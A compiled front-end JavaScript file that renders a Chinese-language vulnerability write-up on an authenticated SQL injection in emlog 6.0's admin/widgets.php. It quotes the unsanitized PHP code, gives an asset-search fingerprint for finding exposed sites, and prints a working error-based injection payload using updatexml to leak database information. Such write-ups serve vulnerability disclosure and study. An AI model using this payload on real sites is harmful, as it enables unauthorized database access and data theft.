import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{r as d,o as s,c as l,a as e,b as a,d as r,e as i}from"./app-58e4a7d6.js";const o={},c=i(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>emlog widgets.php文件在登录后通过构造特殊语句导致SQL注入，获取数据库敏感信息</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>emlog 6.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;EMLOG&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,7),u={href:"https://github.com/emlog/emlog",target:"_blank",rel:"noopener noreferrer"},g=i(`<figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181607870.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>存在漏洞的文件为 <code>admin/widgets.php</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181607539.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>if ($action == &#39;compages&#39;) {
    $wgNum = isset($_POST[&#39;wgnum&#39;]) ? intval($_POST[&#39;wgnum&#39;]) : 1;//侧边栏编号 1、2、3 ……
    $widgets = isset($_POST[&#39;widgets&#39;]) ? serialize($_POST[&#39;widgets&#39;]) : &#39;&#39;;
    Option::updateOption(&quot;widgets{$wgNum}&quot;, $widgets);
    $CACHE-&gt;updateCache(&#39;options&#39;);
    emDirect(&quot;./widgets.php?activated=true&amp;wg=$wgNum&quot;);
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>传参为 wgnum 和 widgets ，跟踪方法 <code>updateOption</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181607343.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>static function updateOption($name, $value, $isSyntax = false){
        $DB = Database::getInstance();
        $value = $isSyntax ? $value : &quot;&#39;$value&#39;&quot;;
        $DB-&gt;query(&#39;UPDATE &#39;.DB_PREFIX.&quot;options SET option_value=$value where option_name=&#39;$name&#39;&quot;);
    }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以发现对传入的参数木有进行过滤，构造Payload</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /admin/widgets.php?action=compages

widgets=1&#39; and updatexml(0x3a,concat(1,(select user())),1)-- 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>调试后可以发现，数据库报错语句会回显至页面中，报错注入即可获取敏感信息</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181608308.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181608878.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,12);function p(m,v){const t=d("ExternalLinkIcon");return s(),l("div",null,[c,e("p",null,[a("产品主页："),e("a",u,[a("https://github.com/emlog/emlog"),r(t)])]),g])}const x=n(o,[["render",p],["__file","emlog widgets.php 后台SQL注入漏洞.html.vue"]]);export{x as default};
